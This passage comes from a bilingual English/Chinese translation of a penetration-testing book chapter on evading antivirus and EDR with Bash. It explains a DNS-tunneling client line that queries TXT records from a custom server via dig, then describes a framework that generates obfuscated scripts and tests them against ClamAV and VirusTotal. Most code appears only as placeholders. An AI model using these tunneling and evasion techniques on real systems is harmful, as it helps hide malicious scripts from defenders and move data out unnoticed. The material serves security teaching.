  zh: '**echo "Sending query for: $key.get.$DOMAIN to $SERVER_IP"** ：这一行打印出发送的查询内容。'
- en: '**local result=$(dig @$SERVER_IP +short TXT "$key.get.$DOMAIN")** : This is
    the core of the function, using the **dig** command to perform a DNS query. Let’s
    break it down:'
  id: totrans-119
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**local result=$(dig @$SERVER_IP +short TXT "$key.get.$DOMAIN")** ：这是函数的核心，使用**dig**命令执行
    DNS 查询。让我们分解一下：'
- en: '**dig** : This is a DNS lookup utility.'
  id: totrans-120
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**dig** ：这是一个 DNS 查询工具。'
- en: '**@$SERVER_IP** : This variable specifies the DNS server to query (your custom
    server).'
  id: totrans-121
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**@$SERVER_IP** ：这个变量指定了要查询的 DNS 服务器（你自定义的服务器）。'
- en: '**+short** : This tells **dig** to give a terse answer. For a **TXT** record,
    this returns only the text data.'
  id: totrans-122
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**+short** ：这告诉**dig**给出简洁的答案。对于**TXT**记录，它只返回文本数据。'
- en: '**TXT** : This specifies that we’re looking for a **TXT** record.'
  id: totrans-123
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**TXT** ：这指定我们正在查找**TXT**记录。'
- en: '**"$key.get.$DOMAIN"** : This is the full domain name we’re querying, constructed
    with the **key** variable, the word **get** , and the **DOMAIN** variable.'
  id: totrans-124
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**"$key.get.$DOMAIN"** ：这是我们查询的完整域名，包含了**key**变量、**get**字眼和**DOMAIN**变量。'
- en: The entire command is wrapped in **$()** , which is a command substitution.
    It runs the command and returns its output, which is then assigned to the **result**
    variable.
  id: totrans-125
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 整个命令被包裹在**$()**中，这是命令替换。它运行命令并返回输出，然后将其分配给**result**变量。
- en: '**if [ -n "$result" ]; then** : This checks whether the **result** variable
    is non-empty.'
  id: totrans-126
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**if [ -n "$result" ]; then** ：这检查**result**变量是否非空。'
- en: 'Inside the **if** block, we have the following:'
  id: totrans-127
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在**if**语句块内部，我们有以下内容：
- en: '**local decoded=$(echo $result | tr -d ''"'' | base64 -d 2>/dev/null)** : This
    line processes the result:'
  id: totrans-128
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**local decoded=$(echo $result | tr -d ''"'' | base64 -d 2>/dev/null)** ：这一行处理结果：'
- en: '**echo $result** : Outputs the result'
  id: totrans-129
  prefs:
  - PREF_IND
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**echo $result** ：输出结果'
- en: '**tr -d ''"''** : Removes any quote characters'
  id: totrans-130
  prefs:
  - PREF_IND
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**tr -d ''"''** ：移除任何引号字符'
- en: '**base64 -d** : Decodes the Base64-encoded string'
  id: totrans-131
  prefs:
  - PREF_IND
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**base64 -d** ：解码 Base64 编码的字符串'
- en: '**2>/dev/null** : Redirects any error messages to **/dev/null** ( discards
    them)'
  id: totrans-132
  prefs:
  - PREF_IND
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**2>/dev/null** ：将任何错误信息重定向到**/dev/null**（丢弃它们）'
- en: '**if [ $? -eq 0 ]; then** : This checks whether the previous command (the Base64
    decoding) was successful:'
  id: totrans-133
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**if [ $? -eq 0 ]; then** ：这检查之前的命令（Base64 解码）是否成功：'
- en: If successful, it prints the decoded data. If not, it prints an error message
    with the raw data.
  id: totrans-134
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 如果成功，它将打印解码后的数据。如果失败，它将打印错误信息和原始数据。
- en: If **result** is empty, it prints **No data found** **for '{$key}'** .
  id: totrans-135
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 如果**result**为空，它会打印**No data found** **for '{$key}'**。
- en: Finally, it prints a separator line.
  id: totrans-136
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 最后，输出一个分隔符行。
- en: The **dig** command is very important here. It’s using DNS to transmit data,
    querying a **TXT** record for a domain name that includes the key we’re interested
    in. The server responds with Base64-encoded data in the **TXT** record, which
    the client then decodes.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: '**dig** 命令在这里非常重要。它使用 DNS 传输数据，查询一个包含我们关心的密钥的**TXT**记录的域名。服务器会在**TXT**记录中返回
    Base64 编码的数据，客户端随后进行解码。'
- en: This method of using DNS for data transfer is sometimes called **DNS tunneling**
    or **DNS exfiltration** . It’s a creative way of transmitting data using a protocol
    (DNS) that’s often allowed through firewalls, even when other protocols are blocked.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 这种使用 DNS 进行数据传输的方法有时被称为**DNS 隧道**或**DNS 外泄**。这是利用一种通常被防火墙允许的协议（DNS）来传输数据的创意方式，即使其他协议被阻止时，仍然可以通过该协议进行数据传输。
- en: Having explored a variety of ways to obfuscate payloads to bypass AV or EDR
    detection, let’s move on to the next section and explore usin g Bash to automate
    script obfuscation.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 在探索了多种规避 AV 或 EDR 检测的混淆载荷方法之后，让我们继续下一部分，探讨如何使用 Bash 自动化脚本混淆。
- en: Automating evasion script generation in Bash
  id: totrans-140
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 自动化 Bash 中的规避脚本生成
- en: To automate the generation of obfuscated Bash scripts, we’ll create a simple
    framework that combines various evasion techniques. This framework will allow
    us to quickly produce scripts that are more likely to evade detection by AV and
    EDR systems.
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 为了自动化生成混淆的 Bash 脚本，我们将创建一个简单的框架，结合多种规避技术。这个框架将帮助我们快速生成更有可能避开 AV 和 EDR 系统检测的脚本。
- en: 'Here’s a basic structure for our framework. The following code can be foun
    d in this chapter’s GitHub repository as **ch14_auto_obfuscate_1.sh** . I’ll be
    breaking the code down into s maller sections to provide explanations:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 这是我们框架的基本结构。以下代码可以在本章的 GitHub 仓库中找到，文件名为**ch14_auto_obfuscate_1.sh**。我将把代码分解成小部分并进行解释：
- en: '[PRE30]'
  id: totrans-143
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: 'The preceding code block provides a function to Base64 encode any data passed
    to the function. In the next part of the code, a function is provided to use the
    **openssl** program to generate random variable names compos ed of four-digit
    hexadecimal characters:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 上面的代码块提供了一个函数来对传递给该函数的任何数据进行 Base64 编码。在代码的下一部分，提供了一个函数，使用**openssl**程序生成由四位十六进制字符组成的随机变量名：
- en: '[PRE31]'
  id: totrans-145
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: 'Then, the Bash code converts the contents of the **cmd** variable into a space-free,
    newline -free hexadecimal string representation:'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，Bash 代码将**cmd**变量的内容转换为一个没有空格和换行符的十六进制字符串表示：
- en: '[PRE32]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: 'The **od** utility is being introduced here. It’s used to output data in various
    formats. The **od -A n -t x1** command is used to display the contents of a file
    or input in a specific format. Here’s the breakdown:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 这里介绍了**od**工具。它用于以各种格式输出数据。**od -A n -t x1**命令用于以特定格式显示文件或输入的内容。以下是详细说明：
- en: '**od** : This stands for **octal dump** and is a command-line utility used
    for displaying data in various formats.'
  id: totrans-149
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**od**：这是**octal dump**的缩写，是一个命令行工具，用于以各种格式显示数据。'
- en: '**-A n** : This option specifies that no address (offset) should be shown in
    the output.'
  id: totrans-150
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-A n**：该选项指定输出中不显示地址（偏移量）。'
- en: '**-t x1** : This indicates the display format. **x** specifies hexadecimal
    format, and **1** indicates 1-byte units. This means the data will be displayed
    as two-digit hexadecimal numbers for each byte.'
  id: totrans-151
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**-t x1**：这表示显示格式。**x**指定十六进制格式，**1**表示1字节单位。这意味着数据将以每个字节的两位十六进制数字显示。'
- en: 'The following code declares important variables and t hen reads the original
    script line by line:'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 以下代码声明了重要变量，然后逐行读取原始脚本：
- en: '[PRE33]'
  id: totrans-153
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: 'The next code block checks whether a line of text matches a specific pattern
    resembling a variable assignment in a script, extracts the variable name, and
    repl aces it with an obfuscated version:'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个代码块检查一行文本是否匹配类似于脚本中变量赋值的特定模式，提取变量名，并将其替换为混淆版本：
- en: '[PRE34]'
  id: totrans-155
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: 'The next Bash code block is designed to match lines that start with a command-like
    string, obfuscate the command, and then replace it within the line with an encoded
    represe ntation:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个 Bash 代码块的设计目的是匹配以命令字符串开头的行，对命令进行混淆，然后在行内用编码后的表示替换它：
- en: '[PRE35]'
  id: totrans-157
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: 'The following code specifies th e original script name as a variable:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 以下代码将原始脚本名指定为一个变量：
- en: '[PRE36]'
  id: totrans-159
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: Then, it declares a variable for the obfuscated script based on the return value
    from the **generate_obfuscated_script** function. The content of this variable
    is then saved to the **obfuscated_script.sh** file.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，它基于**generate_obfuscated_script**函数的返回值声明了一个混淆脚本的变量。该变量的内容随后会被保存到**obfuscated_script.sh**文件中。
- en: This script provides a basic framework for generating obfuscated Bash scripts.
    It includes functions for encoding strings, obfuscating variable names, and obfuscating
    commands. The main **generate_obfuscated_script** function reads an original script,
    applies various obfuscation techniques, and produces an obfuscated version.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 该脚本提供了一个生成混淆 Bash 脚本的基本框架。它包括编码字符串、混淆变量名和混淆命令的函数。主要的**generate_obfuscated_script**函数读取原始脚本，应用各种混淆技术，并生成一个混淆后的版本。
- en: The script works by reading the original script line by line. For each line,
    it checks whether some variable assignments or commands can be obfuscated. Variable
    names are replaced with randomly generated names, and commands are converted into
    hexadecimal representations that are then decoded at runtime.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 该脚本通过逐行读取原始脚本来工作。对于每一行，它检查是否可以对某些变量赋值或命令进行混淆。变量名会被替换成随机生成的名称，命令会被转换成十六进制表示，并在运行时解码。
- en: To make our framework more flexible and extensible, we can implement modular
    obfuscation techniques. This approach allows us to easily add new obfuscation
    methods or combine existing ones in different ways.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使我们的框架更加灵活和可扩展，我们可以实现模块化的混淆技术。该方法使我们能够轻松添加新的混淆方法或以不同的方式组合现有方法。
- en: 'Here’s an example of how we can modify our framework to support modular obfuscation
    techniques. This script can be found in the GitHub repository as **ch14_auto_obfuscate_2.sh**
    :'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是如何修改我们的框架以支持模块化混淆技术的示例。该脚本可以在 GitHub 仓库中找到，文件名为**ch14_auto_obfuscate_2.sh**：
- en: '[PRE37]'
  id: totrans-165
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: The preceding code block creates an array of obfuscation techniques and then
    provides a function to add a technique to the array.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 上面的代码块创建了一个混淆技术数组，并提供了一个函数将技术添加到数组中。
- en: '[PRE38]'
  id: totrans-167
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: In the preceding code block, obfuscation functions are defined.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 在上面的代码块中，定义了混淆函数。
- en: '[PRE39]'
  id: totrans-169
  prefs: []
  type: TYPE_PRE
  zh: '[PRE39]'
- en: In the preceding code section, we choose our obfuscation techniques and add
    them to the **obfuscation_techniques** array.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的代码段中，我们选择了我们的混淆技术并将其添加到**obfuscation_techniques**数组中。
- en: '[PRE40]'
  id: totrans-171
  prefs: []
  type: TYPE_PRE
  zh: '[PRE40]'
- en: In the preceding code, the **apply_random_obfuscation** function randomly chooses
    a technique, then calls the function for that technique and passes the original
    script content into the function call.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的代码中，**apply_random_obfuscation**函数会随机选择一种技术，然后调用该技术的函数并将原始脚本内容传入函数调用中。
- en: '[PRE41]'
  id: totrans-173
  prefs: []
  type: TYPE_PRE
  zh: '[PRE41]'
- en: In the preceding code block, the **generate_obfuscated_script** function processes
    the original script line by line, calling the **apply_random_obfuscation** function
    on each line. The output of each function call is appended to the **obfuscated_script**
    variable before being printed to the terminal.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的代码块中，**generate_obfuscated_script**函数逐行处理原始脚本，在每一行上调用**apply_random_obfuscation**函数。每次函数调用的输出会被追加到**obfuscated_script**变量中，然后打印到终端。
- en: '[PRE42]'
  id: totrans-175
  prefs: []
  type: TYPE_PRE
  zh: '[PRE42]'
- en: In the preceding code, the previously declared functions are called, which ultimately
    ends with the obfuscated script being saved to a file.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的代码中，调用了之前声明的函数，最终会将混淆后的脚本保存到一个文件中。
- en: This updated framework introduces an array of obfuscation techniques and a function
    to add new techniques. The **apply_random_obfuscation** function selects a random
    technique to apply to each line of the script. This modular approach makes it
    easy to add new obfuscation methods or modify existing ones without changing the
    core logic of the script generator.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 这个更新后的框架引入了一系列混淆技术，并提供了一个函数用于添加新的技术。**apply_random_obfuscation**函数会随机选择一种技术应用到脚本的每一行。这个模块化方法使得在不改变脚本生成器核心逻辑的情况下，轻松地添加新的混淆方法或修改现有的混淆方法。
- en: To further enhance our framework, we can create a separate library of evasion
    functions. This library will contain various obfuscation and evasion techniques
    we’ve already covered that can be imported and used in our main script generator.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 为了进一步增强我们的框架，我们可以创建一个独立的规避函数库。这个库将包含我们已经介绍的各种混淆和规避技术，可以被导入并在我们的主脚本生成器中使用。
- en: 'To use this library in our main script generator, we can source it and incorporate
    the evasion functions into our obfuscation techniques. The following line of code
    can be used to source the Bash script containing evasion functions from an external
    script:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 要在我们的主脚本生成器中使用这个库，我们可以将其引用，并将规避函数整合到我们的混淆技术中。以下代码行可以用来从外部脚本中引用包含规避函数的Bash脚本：
- en: '[PRE43]'
  id: totrans-180
  prefs: []
  type: TYPE_PRE
  zh: '[PRE43]'
- en: This is demonstrated in the **ch14_auto_obfuscate_4.sh** script, whic h can
    be found in this chapter’s GitHub repository. Because it is very similar to previous
    versions, with the exception of sourcing the evasion functions from an external
    script, the code will not be shown in its entirety here.
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 这一点在**ch14_auto_obfuscate_4.sh**脚本中得到了展示，脚本可以在本章的GitHub仓库中找到。由于它与以前的版本非常相似，唯一的区别是从外部脚本引用了规避函数，因此这里不会显示完整的代码。
- en: This approach allows us to maintain a separate library of evasion functions,
    making it easier to manage, update, and extend our collection of obfuscation techniques.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 这种方法使我们能够维护一个单独的规避函数库，方便管理、更新和扩展我们的混淆技术集合。
- en: To make our obfuscation process more dynamic and unpredictable, we can develop
    a script that combines multiple evasion methods for each line or command in the
    original script. This approach increases the complexity of the obfuscated script
    and makes it more challenging for detection systems to analyze.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使我们的混淆过程更加动态和不可预测，我们可以开发一个脚本，针对原始脚本中的每一行或命令结合多种规避方法。这个方法增加了混淆脚本的复杂性，使得检测系统更难分析。
- en: 'Here’s an example of how we can modify our script generator to dynamically
    combine evasion methods. This is demonstrated in the following s cript, which
    can be found in the GitHub repository as **ch14_auto_obfuscate_5.sh** :'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是如何修改我们的脚本生成器以动态地结合规避方法的示例。此示例在以下脚本中演示，脚本文件名为**ch14_auto_obfuscate_5.sh**，可以在GitHub仓库中找到：
- en: '[PRE44]'
  id: totrans-185
  prefs: []
  type: TYPE_PRE
  zh: '[PRE44]'
- en: The preceding code sources the code for the obfuscation functions from an external
    file.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 前面的代码从外部文件引用了混淆函数的代码。
- en: '[PRE45]'
  id: totrans-187
  prefs: []
  type: TYPE_PRE
  zh: '[PRE45]'
- en: The main difference between the **apply_multiple_obfuscations** function in
    the preceding code and previous versions is it can use between 1 and 3 obfuscation
    techniques instead of just 1.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 前面代码中**apply_multiple_obfuscations**函数与以前版本的主要区别在于，它可以使用1到3种混淆技术，而不是仅使用1种。
- en: '[PRE46]'
  id: totrans-189
  prefs: []
  type: TYPE_PRE
  zh: '[PRE46]'
- en: In the preceding code, the original script code is processed line by line and
    sent to the **apply_multiple_obfuscations** function. Once the function has processed
    the data and applied obfuscation, it is appended to the **obfuscated_script**
    variable.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的代码中，原始脚本代码按行处理并传递给**apply_multiple_obfuscations**函数。一旦函数处理完数据并应用了混淆，它会将结果附加到**obfuscated_script**变量中。
- en: '[PRE47]'
  id: totrans-191
  prefs: []
  type: TYPE_PRE
  zh: '[PRE47]'
- en: This updated script introduces the **apply_multiple_obfuscations** function,
    which applies a random number of obfuscation techniques to each line of the script.
    This approach creates a more complex and varied obfuscation pattern, making it
    harder to identify patterns or signatures.
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 这个更新后的脚本引入了**apply_multiple_obfuscations**函数，该函数对脚本的每一行应用随机数量的混淆技术。此方法创建了更复杂和多样化的混淆模式，使得识别模式或签名变得更加困难。
- en: After generating obfuscated scripts, it’s important to test and validate them
    against common AV and EDR products. This process helps ensure that our obfuscation
    techniques are effective and allows us to refine our methods based on the results.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 生成混淆脚本后，重要的是对它们进行测试并验证它们在常见的AV和EDR产品中的表现。这个过程有助于确保我们的混淆技术有效，并根据结果优化我们的方法。
- en: 'Here’s a basic script that demonstrates how we might approach testing our obfusc
    ated scripts. It can be found in the GitHub repository as **ch14_auto_obfuscate_6.sh**
    . You’ll need to obtain a VirusTotal API key and replace the **YOUR_API_KEY**
    string before running the script. You can find instructions for obtaining an API
    key at [ht tps://docs.virustotal.com/docs/please-give-me-an-api-key](https://docs.virustotal.com/docs/please-give-me-an-api-key)
    :'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是一个基本的脚本，演示了我们如何测试混淆脚本。它可以在GitHub仓库中找到，文件名是**ch14_auto_obfuscate_6.sh**。你需要获得一个VirusTotal
    API密钥，并在运行脚本前替换**YOUR_API_KEY**字符串。你可以在[https://docs.virustotal.com/docs/please-give-me-an-api-key](https://docs.virustotal.com/docs/please-give-me-an-api-key)找到获取API密钥的说明：
- en: '[PRE48]'
  id: totrans-195
  prefs: []
  type: TYPE_PRE
  zh: '[PRE48]'
- en: The **test_script** function in the preceding code block is responsible for
    performing a scan using the ClamAV software and checking for detections on the
    VirusTotal website.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 上述代码块中的**test_script**函数负责使用ClamAV软件进行扫描，并检查VirusTotal网站上的检测结果。
- en: '[PRE49]'
  id: totrans-197
  prefs: []
  type: TYPE_PRE
  zh: '[PRE49]'
- en: The preceding code block is responsible for generating and testing multiple
    iterations of obfuscation.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 上述代码块负责生成并测试多个混淆迭代版本。
- en: '[PRE50]'
  id: totrans-199
  prefs: []
  type: TYPE_PRE
  zh: '[PRE50]'
- en: This script demonstrates a basic approach to testing obfuscated scripts. The
    **test_script** function simulates testing a script against different AV/EDR solutions.
    In a real-world scenario, you would replace these simulations with actual scans
    using AV/EDR products or online scanning services.
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 这个脚本演示了测试混淆脚本的基本方法。**test_script**函数模拟了将脚本与不同的AV/EDR解决方案进行测试。在实际场景中，你将用AV/EDR产品或在线扫描服务的实际扫描替代这些模拟。
- en: The **generate_and_test** function generates multiple variations of obfuscated
    scripts and tests each one. This allows us to see how different combinations of
    obfuscation techniques perform against detection systems.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: '**generate_and_test**函数生成多个混淆脚本变种，并对每个变种进行测试。这样，我们可以看到不同混淆技术组合在检测系统中的表现。'
- en: The script generates a specified number of obfuscated variations and runs them
    through the testing process, providing results for each variation.
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 该脚本生成指定数量的混淆变种，并通过测试过程对它们进行测试，提供每个变种的结果。
- en: 'It’s important to note that this is a simplified example for demonstration
    purposes. In practice, testing against AV/EDR solutions would involve more comprehensive
    methods, potentially including the following:'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 需要注意的是，这是一个简化的示例，主要用于演示目的。在实际操作中，对AV/EDR解决方案的测试将涉及更全面的方法，可能包括以下内容：
- en: Using a dedicated testing environment or sandbox
  id: totrans-204
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用专门的测试环境或沙盒
- en: Employing multiple AV/EDR products for thorough testing
  id: totrans-205
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用多个AV/EDR产品进行彻底的测试
- en: Analyzing behavioral detection in addition to signature-based detection
  id: totrans-206
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 除了基于签名的检测外，还需要分析行为检测。
- en: Continuously updating the testing process as AV/EDR solutions evolve
  id: totrans-207
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 随着AV/EDR解决方案的发展，不断更新测试过程
- en: By systematically testing and validating our obfuscated scripts, we can refine
    our obfuscation techniques and ensure that they remain effective against current
    detection methods.
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 通过系统地测试和验证我们的混淆脚本，我们可以优化混淆技术，确保它们在当前的检测方法面前依然有效。
- en: Throughout this section, we learned how to create a comprehensive system for
    generating, obfuscating, and testing evasion scripts in Bash. This automated approach
    not only saves time but also allows for the creation of more sophisticated and
    effective evasion techniques.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们学习了如何创建一个全面的系统，用于生成、混淆和测试 Bash 中的规避脚本。这种自动化方法不仅节省了时间，还允许创建更复杂和更有效的规避技术。
- en: Summary
  id: totrans-210
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we explored techniques for evading detection by AV and EDR
    systems during pentests, focusing on Bash shell scripting. We covered methods
    for gathering information about the security environment, basic and advanced obfuscation
    techniques, and strategies for automating the generation of evasive scripts.
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们探讨了在渗透测试中规避 AV 和 EDR 系统检测的技术，重点讨论了 Bash 脚本编写。我们介绍了如何收集有关安全环境的信息、基本和高级混淆技术，以及自动生成规避脚本的策略。
- en: We learned how to use Bash commands to identify installed security software
    and active monitoring processes. We examined various obfuscation methods, including
    variable name obfuscation, command substitution, and encoding techniques. We also
    covered advanced evasion tactics such as timing-based evasion and transferring
    data using DNS. Finally, we discussed the development of a framework for generating
    obfuscated Bash scripts and testing their effectiveness against common AV and
    EDR solutions.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 我们学习了如何使用 Bash 命令来识别已安装的安全软件和正在运行的监控进程。我们探讨了各种混淆方法，包括变量名混淆、命令替换和编码技术。我们还涵盖了高级规避策略，如基于时间的规避和通过
    DNS 传输数据。最后，我们讨论了开发一个框架来生成混淆的 Bash 脚本，并测试其在常见 AV 和 EDR 解决方案下的有效性。
- en: The value of these techniques will become apparent as more stakeholders install
    endpoint protection agents on Linux systems. This will make it more difficult
    to pentest and your new obfuscation skills will be of great benefit.
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 这些技术的价值将随着越来越多的利益相关者在 Linux 系统上安装端点保护代理而显现出来。这将使渗透测试变得更加困难，而你新的混淆技巧将大有裨益。
- en: In [*Chapter 15*](B22229_15.xhtml#_idTextAnchor600) , we’ll explore the topic
    of interfacing with artificial intelligence and its applications in pentesting.
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 在[*第15章*](B22229_15.xhtml#_idTextAnchor600)中，我们将探讨与人工智能交互及其在渗透测试中的应用。
